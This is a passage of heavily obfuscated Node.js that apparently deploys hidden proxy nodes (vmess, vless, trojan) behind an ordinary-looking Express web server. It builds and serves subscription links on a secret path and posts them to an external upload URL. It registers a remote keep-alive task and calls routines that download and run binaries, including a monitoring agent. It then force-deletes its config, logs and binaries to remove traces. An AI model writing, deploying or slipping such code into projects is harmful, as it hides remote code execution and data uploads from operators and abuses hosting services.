axios[_0x38c596(0x8e)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0xbc6424[_0x38c596(0xe9)]&&_0xbc6424[_0x38c596(0xe9)][_0x38c596(_0xab54c8._0xc6f49a)]===_0x38c596(0x126)&&_0xbc6424[_0x38c596(_0xab54c8._0x374f2b)][_0x38c596(0xc4)]&&_0xbc6424[_0x38c596(0xe9)][_0x38c596(0xf3)])return _0xbc6424[_0x38c596(_0xab54c8._0x5c552f)][_0x38c596(_0xab54c8._0x4a610e)]+'_'+_0xbc6424[_0x38c596(0xe9)][_0x38c596(_0xab54c8._0x3384a4)];}catch(_0x34ce69){}}return _0x38c596(_0xab54c8._0x5e2ef1);}async function _0xc1590(_0x31dccf){const _0x1490bd={_0x4420d9:0x93,_0x328701:0xcd,_0x16b663:0xaf,_0x178d98:0xfa,_0xd5cfe8:0xd6,_0x396872:0x116,_0x224cc2:0xca,_0x5b64a8:0x7e,_0x1c625a:0x10e,_0x111c4a:0xc8,_0x11e813:0x11d,_0x19ae2c:0xd6,_0x5e6ebf:0x118,_0x32626b:0xc1,_0x151f31:0x8e},_0x38b4a2=await _0x4db5f0(),_0x5be853=NAME?NAME+'-'+_0x38b4a2:_0x38b4a2;return new Promise(_0x31c894=>{const _0x170b82={_0x110cca:0xd6,_0x46b220:0x118};setTimeout(()=>{const _0xb96ef=_0x4689,_0x2c3867={'v':'2','ps':''+_0x5be853,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xb96ef(_0x1490bd._0x4420d9),'net':'ws','type':'none','host':_0x31dccf,'path':_0xb96ef(0xe7),'tls':_0xb96ef(0x9b),'sni':_0x31dccf,'alpn':'','fp':_0xb96ef(_0x1490bd._0x328701)},_0x495854=_0xb96ef(_0x1490bd._0x16b663)+UUID+'@'+CFIP+':'+CFPORT+_0xb96ef(0x8c)+_0x31dccf+_0xb96ef(0x11c)+_0x31dccf+_0xb96ef(_0x1490bd._0x178d98)+_0x5be853+_0xb96ef(0x10b)+Buffer[_0xb96ef(_0x1490bd._0xd5cfe8)](JSON[_0xb96ef(_0x1490bd._0x396872)](_0x2c3867))[_0xb96ef(_0x1490bd._0x224cc2)](_0xb96ef(0x118))+_0xb96ef(_0x1490bd._0x5b64a8)+UUID+'@'+CFIP+':'+CFPORT+_0xb96ef(_0x1490bd._0x1c625a)+_0x31dccf+'&fp=firefox&type=ws&host='+_0x31dccf+_0xb96ef(0xae)+_0x5be853+_0xb96ef(_0x1490bd._0x111c4a);console[_0xb96ef(_0x1490bd._0x11e813)](Buffer[_0xb96ef(_0x1490bd._0x19ae2c)](_0x495854)[_0xb96ef(0xca)](_0xb96ef(_0x1490bd._0x5e6ebf))),fs[_0xb96ef(0xfe)](subPath,Buffer['from'](_0x495854)[_0xb96ef(_0x1490bd._0x224cc2)](_0xb96ef(_0x1490bd._0x5e6ebf))),console[_0xb96ef(0x11d)](FILE_PATH+_0xb96ef(_0x1490bd._0x32626b)),uploadNodes(),app[_0xb96ef(_0x1490bd._0x151f31)]('/'+SUB_PATH,(_0x347975,_0x37ce53)=>{const _0x55205b=_0xb96ef,_0x32041c=Buffer[_0x55205b(_0x170b82._0x110cca)](_0x495854)['toString'](_0x55205b(_0x170b82._0x46b220));_0x37ce53[_0x55205b(0x110)](_0x55205b(0x117),'text/plain;\x20charset=utf-8'),_0x37ce53['send'](_0x32041c);}),_0x31c894(_0x495854);},0x7d0);});}}async function uploadNodes(){const _0x47e4b9={_0x35a67d:0x86,_0x197a4a:0x10f,_0xf2a0d0:0x9f,_0x335d29:0x133,_0x192cd9:0xeb,_0x502a67:0x10d},_0x549c3d=_0x1a9985;if(UPLOAD_URL&&PROJECT_URL){const _0x33fd1c=PROJECT_URL+'/'+SUB_PATH,_0x4f713d={'subscription':[_0x33fd1c]};try{const _0x32df67=await axios[_0x549c3d(_0x47e4b9._0x35a67d)](UPLOAD_URL+'/api/add-subscriptions',_0x4f713d,{'headers':{'Content-Type':_0x549c3d(0xd2)}});return _0x32df67&&_0x32df67[_0x549c3d(_0x47e4b9._0x197a4a)]===0xc8?(console['log']('Subscription\x20uploaded\x20successfully'),_0x32df67):null;}catch(_0x482a52){if(_0x482a52['response']){if(_0x482a52[_0x549c3d(0x78)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x549c3d(0xd7)](listPath))return;const _0x36b290=fs[_0x549c3d(_0x47e4b9._0xf2a0d0)](listPath,'utf-8'),_0x10bd67=_0x36b290[_0x549c3d(_0x47e4b9._0x335d29)]('\x0a')[_0x549c3d(0x114)](_0x1b0889=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1b0889));if(_0x10bd67[_0x549c3d(0xbf)]===0x0)return;const _0x2d9564=JSON[_0x549c3d(0x116)]({'nodes':_0x10bd67});try{const _0x3696bb=await axios[_0x549c3d(0x86)](UPLOAD_URL+_0x549c3d(_0x47e4b9._0x192cd9),_0x2d9564,{'headers':{'Content-Type':'application/json'}});return _0x3696bb&&_0x3696bb[_0x549c3d(0x10f)]===0xc8?(console[_0x549c3d(0x11d)](_0x549c3d(_0x47e4b9._0x502a67)),_0x3696bb):null;}catch(_0x231e75){return null;}}else return;}}function cleanFiles(){const _0x4d6fca={_0x51ca76:0x107,_0x8fbc52:0x119,_0xa562ec:0xec},_0x331cba={_0x3737c7:0x102,_0x5cab1d:0xe0,_0x259354:0x89};setTimeout(()=>{const _0x508b3a={_0x58e20a:0x102,_0x3822f5:0x11d,_0x48e71a:0xe0,_0x289ea8:0x89},_0x2021f4=_0x4689,_0x65d3a2=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x65d3a2['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x65d3a2[_0x2021f4(_0x4d6fca._0x51ca76)](phpPath);process[_0x2021f4(0xcf)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x65d3a2[_0x2021f4(_0x4d6fca._0x8fbc52)]('\x20')+'\x20>\x20nul\x202>&1',_0x2d2c2b=>{const _0x2ead6a=_0x2021f4;console[_0x2ead6a(_0x508b3a._0x58e20a)](),console[_0x2ead6a(_0x508b3a._0x3822f5)](_0x2ead6a(_0x508b3a._0x48e71a)),console[_0x2ead6a(0x11d)](_0x2ead6a(_0x508b3a._0x289ea8));}):exec(_0x2021f4(0x99)+_0x65d3a2[_0x2021f4(_0x4d6fca._0x8fbc52)]('\x20')+_0x2021f4(_0x4d6fca._0xa562ec),_0x53ed2f=>{const _0x35506b=_0x2021f4;console[_0x35506b(_0x331cba._0x3737c7)](),console[_0x35506b(0x11d)](_0x35506b(_0x331cba._0x5cab1d)),console['log'](_0x35506b(_0x331cba._0x259354));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x48ed75={_0x410d59:0x11d,_0x503287:0xa2},_0x26d2a8=_0x1a9985;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x26d2a8(0x131));return;}try{const _0x176ebd=await axios[_0x26d2a8(0x86)](_0x26d2a8(0xb2),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x26d2a8(_0x48ed75._0x410d59)]('automatic\x20access\x20task\x20added\x20successfully'),_0x176ebd;}catch(_0x1c38e2){return console[_0x26d2a8(_0x48ed75._0x503287)](_0x26d2a8(0xef)+_0x1c38e2[_0x26d2a8(0xf5)]),null;}}async function startserver(){const _0x46a394={_0x55f003:0x112},_0x2bc654=_0x1a9985;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x33f275){console[_0x2bc654(0xa2)](_0x2bc654(_0x46a394._0x55f003),_0x33f275);}}startserver()['catch'](_0x4b649c=>{const _0x56f09d={_0x541da3:0xa2},_0x325e4e=_0x1a9985;console[_0x325e4e(_0x56f09d._0x541da3)](_0x325e4e(0x103),_0x4b649c);}),app['listen'](PORT,()=>console['log'](_0x1a9985(0x12c)+PORT+'!'));
